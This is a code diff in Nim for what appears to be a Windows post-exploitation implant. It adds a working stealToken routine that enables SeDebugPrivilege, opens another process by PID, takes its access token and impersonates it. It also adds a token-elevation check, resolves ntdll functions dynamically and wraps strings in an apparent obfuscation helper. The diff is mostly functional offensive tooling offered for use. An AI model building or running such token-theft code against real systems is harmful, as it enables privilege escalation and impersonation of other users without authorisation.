@@ -23,6 +23,7 @@ type
     NtDuplicateToken = proc(existingTokenHandle: HANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, effectiveOnly: BOOLEAN, tokenType: TOKEN_TYPE, newTokenHandle: PHANDLE): NTSTATUS {.stdcall.}
     NtAdjustPrivilegesToken = proc(hToken: HANDLE, disableAllPrivileges: BOOLEAN, newState: PTOKEN_PRIVILEGES, bufferLength: ULONG, previousState: PTOKEN_PRIVILEGES, returnLength: PULONG): NTSTATUS {.stdcall.}
     NtClose = proc(handle: HANDLE): NTSTATUS {.stdcall.}
+    NtOpenProcess = proc(hProcess: PHANDLE, desiredAccess: ACCESS_MASK, oa: PCOBJECT_ATTRIBUTES, clientId: PCLIENT_ID): NTSTATUS {.stdcall.}
 
     Apis = object
         NtOpenProcessToken: NtOpenProcessToken
@@ -31,8 +32,9 @@ type
         ConvertSidToSTringSidA: ConvertSidToSTringSidA
         NtSetInformationThread: NtSetInformationThread
         NtDuplicateToken: NtDuplicateToken
-        NtAdjustPrivilegesToken: NtAdjustPrivilegesToken 
         NtClose: NtClose
+        NtAdjustPrivilegesToken: NtAdjustPrivilegesToken 
+        NtOpenProcess: NtOpenProcess
 
 proc initApis(): Apis = 
     let hNtdll = GetModuleHandleA(protect("ntdll"))
@@ -45,7 +47,7 @@ proc initApis(): Apis =
     result.NtDuplicateToken = cast[NtDuplicateToken](GetProcAddress(hNtdll, protect("NtDuplicateToken")))
     result.NtClose = cast[NtClose](GetProcAddress(hNtdll, protect("NtClose")))
     result.NtAdjustPrivilegesToken = cast[NtAdjustPrivilegesToken](GetProcAddress(hNtdll, protect("NtAdjustPrivilegesToken")))
-
+    result.NtOpenProcess = cast[NtOpenProcess](GetProcAddress(hNtdll, protect("NtOpenProcess")))
     
 const 
     CURRENT_PROCESS = cast[HANDLE](-1)
@@ -138,6 +140,18 @@ proc getTokenUser(apis: Apis, hToken: HANDLE): tuple[username, sid: string] =
     
     return (apis.sidToName(pUser.User.Sid), apis.sidToString(pUser.User.Sid))
 
+proc getTokenElevation(apis: Apis, hToken: HANDLE): bool = 
+    var 
+        status: NTSTATUS = 0
+        returnLength: ULONG = 0
+        pElevation: TOKEN_ELEVATION 
+    
+    status = apis.NtQueryInformationToken(hToken, tokenElevation, addr pElevation, cast[ULONG](sizeof(pElevation)), addr returnLength)
+    if status != STATUS_SUCCESS: 
+        raise newException(CatchableError, protect("NtQueryInformationToken - Token Elevation ") & $status.toHex())
+
+    return cast[bool](pElevation.TokenIsElevated)
+
 proc getTokenGroups(apis: Apis, hToken: HANDLE): string = 
     var
         status: NTSTATUS = 0
@@ -199,12 +213,15 @@ proc getTokenInfo*(hToken: HANDLE): string =
     let apis = initApis() 
 
     let (tokenId, tokenType) = apis.getTokenStatistics(hToken)
-    result &= fmt"TokenID: 0x{tokenId}" & "\n"
-    result &= fmt"Type:    {tokenType}" & "\n"
-
+    result &= fmt"TokenID:  0x{tokenId}" & "\n"
+    result &= fmt"Type:     {tokenType}" & "\n"
+ 
     let (username, sid) = apis.getTokenUser(hToken)
-    result &= fmt"User:    {username}" & "\n"
-    result &= fmt"SID:     {sid}" & "\n"
+    result &= fmt"User:     {username}" & "\n"
+    result &= fmt"SID:      {sid}" & "\n"
+    
+    let isElevated = apis.getTokenElevation(hToken)
+    result &= fmt"Elevated: {$isElevated}" & "\n"
 
     result &= apis.getTokenGroups(hToken    )
     result &= apis.getTokenPrivileges(hToken)
@@ -292,13 +309,10 @@ proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_L
     if LogonUserA(username, domain, password, logonType, provider, addr hToken) == FALSE:
         raise newException(CatchableError, $GetLastError())
     defer: discard apis.NtClose(hToken)
-
+    
     apis.impersonate(hToken)
 
     return apis.getTokenUser(hToken).username
-
-proc stealToken*(pid: int): bool = 
-    discard 
 
 proc enablePrivilege*(privilegeName: string, enable: bool = true): string = 
     
@@ -328,3 +342,41 @@ proc enablePrivilege*(privilegeName: string, enable: bool = true): string =
 
     let action = if enable: protect("Enabled") else: protect("Disabled")
     return fmt"{action} {apis.privilegeToString(addr luid)}."
+
+#[
+    Steal the access token of a remote process
+]#
+proc stealToken*(pid: int): string = 
+    
+    let apis = initApis() 
+    
+    var 
+        status: NTSTATUS
+        hProcess: HANDLE 
+        hToken: HANDLE 
+        clientId: CLIENT_ID 
+        oa: OBJECT_ATTRIBUTES
+
+    # Enable the SeDebugPrivilege in the current token
+    # This privilege is required in order to duplicate and impersonate the access token of a remote process
+    discard enablePrivilege(protect("SeDebugPrivilege"))
+
+    InitializeObjectAttributes(addr oa, NULL, 0, 0, NULL)
+    clientId.UniqueProcess = cast[HANDLE](pid)
+    clientId.UniqueThread = 0
+
+    # Open a handle to the target process
+    status = apis.NtOpenProcess(addr hProcess, PROCESS_QUERY_INFORMATION, addr oa, addr clientId)
+    if status != STATUS_SUCCESS: 
+        raise newException(CatchableError, protect("NtOpenProcess ") & $status.toHex())
+    defer: discard apis.NtClose(hProcess)
+
+    # Open a handle to the primary access token of the target process
+    status = apis.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, addr hToken)
+    if status != STATUS_SUCCESS: 
+        raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())
+    defer: discard apis.NtClose(hToken)
+
+    apis.impersonate(hToken)
+
+    return apis.getTokenUser(hToken).username
